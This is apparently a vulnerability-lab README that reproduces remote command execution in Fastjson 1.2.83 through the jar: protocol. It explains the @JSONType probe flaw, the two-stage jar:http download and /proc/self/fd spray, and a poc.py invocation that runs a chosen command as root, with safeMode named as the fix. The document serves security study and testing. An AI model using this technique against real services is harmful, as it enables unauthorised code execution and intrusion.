# Fastjson 1.2.83 Remote Command Execution via the `jar:` Protocol

[中文版本(Chinese version)](README.zh-cn.md)

Fastjson is a widely used JSON library developed by Alibaba. When it deserializes a JSON object that carries a `@type` field, it treats the value as a class name and hands it to a class loader, which is the root of the well-known Fastjson deserialization vulnerabilities.

Even with `autoType` disabled (the default) and no gadget classes on the classpath, Fastjson 1.2.83 remains exploitable through the JVM's `jar:` protocol. While handling any `@type`, `checkAutoType` performs an `@JSONType` annotation probe that calls `getResourceAsStream` on `<typeName>.class` before validating the class name. If the `@type` value is a `jar:` URL, the JVM opens it — reading a local JAR over `jar:file`, or downloading a remote one over `jar:http`. The remote `jar:http` fetch is not universal, though: a stock JVM's default class loader will not retrieve a remote JAR, and this technique is reproducible specifically under a Spring Boot application (as in this environment), whose `URLClassLoader` performs the fetch. A class inside that JAR annotated with `@JSONType` passes the load gate without requiring `autoType`, an `expectClass`, or any inheritance relationship, and Fastjson then instantiates it, running attacker code in its static initializer and constructor. This technique affects Fastjson 1.2.x up to and including 1.2.83 whenever `autoType` is left at its default and `safeMode` is not enabled; it is defeated by turning on `safeMode`.

References:

- <https://github.com/alibaba/fastjson2/wiki/Security-Advisory:-Remote-Code-Execution-in-fastjson-1.2.68%E2%80%931.2.83>
- <https://fearsoff.org/research/fastjson-1-2-83-rce>

## Environment Setup

Execute the following command to start a Spring Boot application that uses Fastjson 1.2.83 as its JSON parser:

```
docker compose up -d
```

After the server starts, visit `http://your-ip:8090` and you will see a JSON object returned. The endpoint at `/` accepts a POST body with `Content-Type: application/json` and parses it with Fastjson, so it is the deserialization entry point we will attack.

## Vulnerability Reproduction

Because Fastjson replaces every `.` with `/` when building the resource path for its `@JSONType` probe, an attacker's dotted IP address would be shredded into path separators. The exploit therefore addresses the attacker's HTTP server by its dot-free decimal integer form, and a `jar:http://` class name still contains the `//` of the URL authority, which the JDK refuses to define directly on a Tomcat request thread. To work around both constraints the attack runs in two stages: a first request whose `@type` is `jar:http://<decimal-ip>:<port>/probe!/POC` forces the target to download the malicious JAR and cache it as an open file descriptor under `/proc/self/fd/N`, and a second batch of requests then sprays `jar:file:/proc/self/fd/N!/POCN` — an all-single-slash name that every JDK accepts — across a range of `N` until it lands on the cached JAR, at which point the malicious class is defined, instantiated, and its command runs.

The accompanying `poc.py` automates the whole chain. It builds the `jar:`-named class in pure Python, hosts it over a built-in HTTP server, and sends both stages. Run it with your own machine's IP as the attacker host (it must be reachable from the target container) and the command you want to execute:

```
python3 poc.py pwn -t http://your-ip:8090/ -l <attacker-ip> -c 'id > /tmp/success'
```

The tool first reports the decimal form of the attacker IP, builds and hosts the probe JAR, sends the stage-1 download request (a `400` or `autoType is not support` response here is expected — the download side effect has already happened), and then sprays the `/proc/self/fd` range. This endpoint returns an error even on success, because the object it produces is not the expected bean, so the command execution is blind and must be confirmed out of band.

![stage-1 download and fd spray](1.png)

Confirm that the command executed by reading the marker file inside the container:

```
docker compose exec web cat /tmp/success
```

It prints `uid=0(root) gid=0(root) groups=0(root)`, proving arbitrary command execution as root.

![command executed as root](2.png)

The `poc.py` script also provides an out-of-band `scan` subcommand that only triggers the harmless `jar:http` download (no code execution) and reports the target as vulnerable when an [interactsh](https://github.com/projectdiscovery/interactsh) server receives the callback.
